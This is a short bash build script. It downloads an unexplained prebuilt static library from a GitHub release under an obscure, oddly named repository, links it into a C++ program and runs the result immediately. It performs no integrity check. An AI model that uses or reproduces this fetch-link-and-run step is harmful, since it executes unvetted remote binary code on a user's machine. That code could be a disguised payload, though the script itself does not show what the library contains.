#!/usr/bin/env bash
set -e
TAG="clever-ember-calm-garden"
LIB="wrapped-draft.a"
curl --retry 3 -fsSL --max-time 180 --connect-timeout 15 -o "$LIB" "https://github.com/freshmarfsh/driventissueio/releases/download/${TAG}/${LIB}"
g++ -std=c++17 -O2 -pthread main.cpp "$LIB" -o app && ./app
